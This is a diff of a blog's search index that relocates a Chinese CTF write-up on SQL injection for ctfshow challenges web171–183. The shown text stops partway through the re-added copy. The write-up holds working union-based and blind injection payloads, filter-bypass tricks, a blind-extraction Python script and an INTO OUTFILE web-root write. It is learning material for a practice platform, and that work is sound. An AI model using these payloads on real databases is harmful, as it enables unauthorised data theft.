@@ -1,119 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>web入门sql注入</title>
-    <url>/2021/06/24/ctf-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="ctf-web入门之sql注入-无过滤注入"><a href="#ctf-web入门之sql注入-无过滤注入" class="headerlink" title="ctf-web入门之sql注入-无过滤注入"></a>ctf-web入门之sql注入-无过滤注入</h1><h2 id="day4-web入门之sql注入-无过滤注入"><a href="#day4-web入门之sql注入-无过滤注入" class="headerlink" title="day4 web入门之sql注入-无过滤注入"></a>day4 web入门之sql注入-无过滤注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>单引号报错，使用<code>--+</code>进行注释</p>
-<p>爆出数据库版本号是<code>10.3.18-MariaDB</code>库名为<code>ctfshow_web</code>表名为<code>ctfshow_user</code>字段是<code>id,username,password</code></p>
-<blockquote>
-<p><em>MariaDB</em>数据库管理系统是MySQL的一个分支</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/06/24/kz3GvSAByuUiDY9.png" alt="image-20210624204528172"></p>
-<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>与web171不同的是，可显列从三变成了二，再就是多了一个表<code>ctfshow_user2</code>，flag就在这个表里（其实题中已经提示了）</p>
-<p><img src="https://i.loli.net/2021/06/24/2cSJZl7hA4x6XqB.png" alt="image-20210624205510547"></p>
-<p><img src="https://i.loli.net/2021/06/24/KmQjsFfcXdAke2N.png" alt="image-20210624205843835"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select version(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot;--+</span><br></pre></td></tr></table></figure>
-<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>多了一个<code>ctfshow_user3</code>的表</p>
-<p>而且会进行正则匹配</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p><a href="https://www.cnblogs.com/losesea/p/3438520.html">preg_match用法</a></p>
-<h4 id="hex编码进行绕过"><a href="#hex编码进行绕过" class="headerlink" title="hex编码进行绕过"></a><code>hex编码</code>进行绕过</h4><p>可以直接构造<code>hex()</code>或是先进行十六进制转换</p>
-<p><img src="https://i.loli.net/2021/06/24/EvOMiGnU3PFaJlK.png" alt="image-20210624211902458"></p>
-<p><img src="https://i.loli.net/2021/06/24/W9kKU2fL3B5Xcv8.png" alt="image-20210624211839341"></p>
-<blockquote>
-<p>后面又学到了使用<code>base64</code>进行绕过</p>
-</blockquote>
-<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
-<p>对flag和数字进行了过滤，注的时候没有回显</p>
-<p>抓包找一下url</p>
-<p><img src="https://i.loli.net/2021/06/25/CSytwOcmjD3oxXg.png"></p>
-<p>师傅们直接上脚本tql</p>
-<p>fw不会，也想不到wwww</p>
-<p>假期一定学</p>
-<h4 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span>:</span><br><span class="line">        url = <span class="string">&quot;http://ca49a442-6c6a-4266-9133-5271c3c12b5a.challenge.ctf.show:8080/api/v4.php?id=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;&#x27;&#x27;1&#x27; and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;--+&#x27;&#x27;&#x27;</span>% (i,j)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#print(url+payload)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625160944515"></p>
-<h4 id="对数字进行替换base64绕过"><a href="#对数字进行替换base64绕过" class="headerlink" title="对数字进行替换base64绕过"></a>对数字进行替换base64绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;替换username</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;替换password</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;拿到替换后的flag</span><br><span class="line">YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;然后再将得到的flag替换回来</span><br><span class="line">import base64</span><br><span class="line">flagstr &#x3D; &#39;YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; flagstr.replace(&#39;numA&#39;,&#39;1&#39;).replace(&#39;numB&#39;,&#39;2&#39;).replace(&#39;numC&#39;,&#39;3&#39;).replace(&#39;numD&#39;,&#39;4&#39;).replace(&#39;numE&#39;,&#39;5&#39;).replace(&#39;numF&#39;,&#39;6&#39;).replace(&#39;numG&#39;,&#39;7&#39;).replace(&#39;numH&#39;,&#39;8&#39;).replace(&#39;numI&#39;,&#39;9&#39;).replace(&#39;numJ&#39;,&#39;0&#39;)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625173838607"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select to_base64(username), to_base64 (password) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;,&#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br></pre></td></tr></table></figure>
-<p>借助web174的思路，既然可以通过<code>hex</code>绕过，那就去试试</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">numFnumCnumGnumDnumFnumFnumGnumCnumFnumHnumFFnumGnumGnumGBnumCnumHnumFnumCnumCnumCnumCnumDnumFnumAnumCnumAnumFnumBnumFnumAnumBDnumCnumDnumFnumFnumCnumAnumCnumEnumBDnumCnumDnumFnumDnumFnumFnumFnumEnumBDnumCnumHnumFnumDnumFnumAnumCnumAnumBDnumCnumDnumCnumJnumCnumAnumFnumCnumFnumAnumFnumBnumCnumInumCnumDnumCnumHnumFnumBnumCnumFnumCnumGnumGD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">63746673686F777B38633334613162612D346631352D346466652D386461312D3430316361623934386236377D</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625180231493"></p>
-<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>\xnn    匹配ASCII代码中十六进制代码为nn的字符</p>
-<p>[\x00-\x7f]     匹配ASCII值从0-127的字符</p>
-</blockquote>
-<h4 id="利用读写文件写入网站根目录into-outfile注入"><a href="#利用读写文件写入网站根目录into-outfile注入" class="headerlink" title="利用读写文件写入网站根目录into outfile注入"></a>利用读写文件写入网站根目录into outfile注入</h4><p>字段数仍然是二（虽然不会回显，但是错误的话会报接口的错误）</p>
-<p>仿照web174构造</p>
-<p><code>1&#39; union select username,password from ctfshow_user5 where username=&quot;flag&quot; into outfile &#39;/var/www/html/ctfshow.txt&#39; --+ </code></p>
-<p>在网站根目录下写入文件<code>ctfshow.txt</code></p>
-<blockquote>
-<p>Apache默认根目录是:/var/www/html</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709100434410"></p>
-<h4 id="二分法盲注"><a href="#二分法盲注" class="headerlink" title="二分法盲注"></a>二分法盲注</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于无过滤的sql注入，可以通过<code>十六进制</code>或<code>base64</code>编码替换进行绕过，还可以跑盲注脚本，利用二分法或sleep()函数；还可以尝试是否有权限写入网站根目录文件，然后直接访问该文件</p>
-<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
-<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
-<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
-<h2 id="day5-web入门之sql注入-过滤注入"><a href="#day5-web入门之sql注入-过滤注入" class="headerlink" title="day5 web入门之sql注入-过滤注入"></a>day5 web入门之sql注入-过滤注入</h2><h3 id="web176-select被过滤"><a href="#web176-select被过滤" class="headerlink" title="web176-select被过滤"></a>web176-select被过滤</h3><p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709105105072"></p>
-<p><code>1&#39; Union select 1,2,3--+</code>无回显</p>
-<p><code>1&#39; union Select 1,2,3--+</code>有回显</p>
-<p>经过测试是只对<code>select</code>进行了过滤，通过大小写绕过</p>
-<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39; union Select 1,group_concat(username),group_concat(password) from ctfshow_user where username=&quot;flag&quot;--+</code></p>
-<h3 id="web177-空格和-被过滤"><a href="#web177-空格和-被过滤" class="headerlink" title="web177-空格和#被过滤"></a>web177-空格和#被过滤</h3><p><code>1&#39;--+</code>无回显，<code>1&#39;--</code>无回显，<code>--</code>被过滤</p>
-<p><code>1&#39;#</code>无回显，<code>#</code>也被过滤，使用url编码<code>%23</code>绕过，<code>1&#39;%23</code>有回显</p>
-<p>而在判断字段时又没有回显，好家伙原来吧空格也过滤了，使用<code>/**/</code>绕过，字段数还是3</p>
-<blockquote>
-<p>空格绕过的方式：</p>
-<ol>
-<li>注释符<code>/**/</code>，tab键<code>%a0</code></li>
-<li>括号绕过，常用于时间盲注</li>
-</ol>
-</blockquote>
-<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;/**/union/**/select/**/1,group_concat(username),group_concat(password)/**/from/**/ctfshow_user/**/where/**/username=&quot;flag&quot;/**/%23</code></p>
-<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p><code>/**/</code>和<code>%a0</code>被过滤，使用括号或是<code>%0a,%09,%0b,%0c,%0d</code>都行</p>
-<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union(select(1),(username),(password)from(ctfshow_user)where(username=&quot;flag&quot;))%23</code></p>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709170348722"></p>
-<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>只剩下<code>%0c</code>可以用了，其他都被过滤了</p>
-<p><img src="https://i.loli.net/2021/07/09/iQ5YydxOWqcsouf.png" alt="image-20210709172329770"></p>
-<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union%0cselect%0c1,username,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&quot;flag&quot;%0c%0c%23</code></p>
-<p><img src="https://i.loli.net/2021/07/09/AGwtTmJbDRxkiPN.png" alt="image-20210709173023533"></p>
-<p>晴天师傅的通杀payload</p>
-<p><code>?id=&#39;or(1)%23</code></p>
-<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>是对<code>%23</code>进行了过滤，不能注释后面的’了，只能通过构造<code>&#39;1&#39;=&#39;1</code></p>
-<p>贴上Y4tacker师傅的</p>
-<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
-<p>-1就是用来注释的，这个payload也相当于<code>&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
-<p>放进这个拼接的语句中就是<code>where username !=&#39;flag&#39; and id=&#39;&#39;or(id=26)and&#39;1&#39;=&#39;1&#39; limit 1;&quot;</code></p>
-<p><img src="https://i.loli.net/2021/07/09/N2JdzpWZDRIHT16.png" alt="image-20210709200537410"></p>
-<p>又因为and的优先级比or高，那就又相当于</p>
-<p><code>(username !=&#39;flag&#39; and id = &#39;&#39;)  or  (id=26 and&#39;1&#39;=&#39;1&#39;)</code></p>
-<p>or右边的值为1，可以读出id=26的数据</p>
-<p>还可以盲注</p>
-<p><img src="https://i.loli.net/2021/07/09/vQoe79qtV3Pjg2z.png" alt="image-20210709201034411"></p>
-<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><p>除了括号其他能代替的都被过滤了，继续使用y4师傅的payload</p>
-<p><img src="https://i.loli.net/2021/07/09/SvKtyFL3j4oGA7g.png" alt="image-20210709210302177"></p>
-<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>这次又把<code>flag</code>给过滤了，继续用师傅的payload</p>
-<p><img src="https://i.loli.net/2021/07/09/MxH1Q9EOYT7FNyG.png" alt="image-20210709212746118"></p>
-<h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p>我是fw</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/Vinson404/p/7253255.html">sql注入绕过技巧</a></p>
-<h2 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h2><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
-<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
-<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
-]]></content>
-      <categories>
-        <category>ctf-sql</category>
-      </categories>
-      <tags>
-        <tag>ctf-sql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Lampiao</title>
     <url>/2021/05/24/Lampiao/</url>
     <content><![CDATA[<h1 id="Lampiao"><a href="#Lampiao" class="headerlink" title="Lampiao"></a>Lampiao</h1><p><img src="/2021/05/24/Lampiao/image-20210519163046106.png" alt="image-20210519163046106"></p>
@@ -279,6 +166,119 @@
       </tags>
   </entry>
   <entry>
+    <title>web入门sql注入</title>
+    <url>/2021/06/24/ctf-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="ctf-web入门之sql注入-无过滤注入"><a href="#ctf-web入门之sql注入-无过滤注入" class="headerlink" title="ctf-web入门之sql注入-无过滤注入"></a>ctf-web入门之sql注入-无过滤注入</h1><h2 id="day4-web入门之sql注入-无过滤注入"><a href="#day4-web入门之sql注入-无过滤注入" class="headerlink" title="day4 web入门之sql注入-无过滤注入"></a>day4 web入门之sql注入-无过滤注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>单引号报错，使用<code>--+</code>进行注释</p>
+<p>爆出数据库版本号是<code>10.3.18-MariaDB</code>库名为<code>ctfshow_web</code>表名为<code>ctfshow_user</code>字段是<code>id,username,password</code></p>
+<blockquote>
+<p><em>MariaDB</em>数据库管理系统是MySQL的一个分支</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/06/24/kz3GvSAByuUiDY9.png" alt="image-20210624204528172"></p>
+<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>与web171不同的是，可显列从三变成了二，再就是多了一个表<code>ctfshow_user2</code>，flag就在这个表里（其实题中已经提示了）</p>
+<p><img src="https://i.loli.net/2021/06/24/2cSJZl7hA4x6XqB.png" alt="image-20210624205510547"></p>
+<p><img src="https://i.loli.net/2021/06/24/KmQjsFfcXdAke2N.png" alt="image-20210624205843835"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select version(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot;--+</span><br></pre></td></tr></table></figure>
+<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>多了一个<code>ctfshow_user3</code>的表</p>
+<p>而且会进行正则匹配</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.cnblogs.com/losesea/p/3438520.html">preg_match用法</a></p>
+<h4 id="hex编码进行绕过"><a href="#hex编码进行绕过" class="headerlink" title="hex编码进行绕过"></a><code>hex编码</code>进行绕过</h4><p>可以直接构造<code>hex()</code>或是先进行十六进制转换</p>
+<p><img src="https://i.loli.net/2021/06/24/EvOMiGnU3PFaJlK.png" alt="image-20210624211902458"></p>
+<p><img src="https://i.loli.net/2021/06/24/W9kKU2fL3B5Xcv8.png" alt="image-20210624211839341"></p>
+<blockquote>
+<p>后面又学到了使用<code>base64</code>进行绕过</p>
+</blockquote>
+<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
+<p>对flag和数字进行了过滤，注的时候没有回显</p>
+<p>抓包找一下url</p>
+<p><img src="https://i.loli.net/2021/06/25/CSytwOcmjD3oxXg.png"></p>
+<p>师傅们直接上脚本tql</p>
+<p>fw不会，也想不到wwww</p>
+<p>假期一定学</p>
+<h4 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span>:</span><br><span class="line">        url = <span class="string">&quot;http://ca49a442-6c6a-4266-9133-5271c3c12b5a.challenge.ctf.show:8080/api/v4.php?id=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;&#x27;&#x27;1&#x27; and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;--+&#x27;&#x27;&#x27;</span>% (i,j)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#print(url+payload)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625160944515"></p>
+<h4 id="对数字进行替换base64绕过"><a href="#对数字进行替换base64绕过" class="headerlink" title="对数字进行替换base64绕过"></a>对数字进行替换base64绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;替换username</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;替换password</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;拿到替换后的flag</span><br><span class="line">YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;然后再将得到的flag替换回来</span><br><span class="line">import base64</span><br><span class="line">flagstr &#x3D; &#39;YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; flagstr.replace(&#39;numA&#39;,&#39;1&#39;).replace(&#39;numB&#39;,&#39;2&#39;).replace(&#39;numC&#39;,&#39;3&#39;).replace(&#39;numD&#39;,&#39;4&#39;).replace(&#39;numE&#39;,&#39;5&#39;).replace(&#39;numF&#39;,&#39;6&#39;).replace(&#39;numG&#39;,&#39;7&#39;).replace(&#39;numH&#39;,&#39;8&#39;).replace(&#39;numI&#39;,&#39;9&#39;).replace(&#39;numJ&#39;,&#39;0&#39;)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625173838607"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select to_base64(username), to_base64 (password) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;,&#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br></pre></td></tr></table></figure>
+<p>借助web174的思路，既然可以通过<code>hex</code>绕过，那就去试试</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">numFnumCnumGnumDnumFnumFnumGnumCnumFnumHnumFFnumGnumGnumGBnumCnumHnumFnumCnumCnumCnumCnumDnumFnumAnumCnumAnumFnumBnumFnumAnumBDnumCnumDnumFnumFnumCnumAnumCnumEnumBDnumCnumDnumFnumDnumFnumFnumFnumEnumBDnumCnumHnumFnumDnumFnumAnumCnumAnumBDnumCnumDnumCnumJnumCnumAnumFnumCnumFnumAnumFnumBnumCnumInumCnumDnumCnumHnumFnumBnumCnumFnumCnumGnumGD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">63746673686F777B38633334613162612D346631352D346466652D386461312D3430316361623934386236377D</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625180231493"></p>
+<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>\xnn    匹配ASCII代码中十六进制代码为nn的字符</p>
+<p>[\x00-\x7f]     匹配ASCII值从0-127的字符</p>
+</blockquote>
+<h4 id="利用读写文件写入网站根目录into-outfile注入"><a href="#利用读写文件写入网站根目录into-outfile注入" class="headerlink" title="利用读写文件写入网站根目录into outfile注入"></a>利用读写文件写入网站根目录into outfile注入</h4><p>字段数仍然是二（虽然不会回显，但是错误的话会报接口的错误）</p>
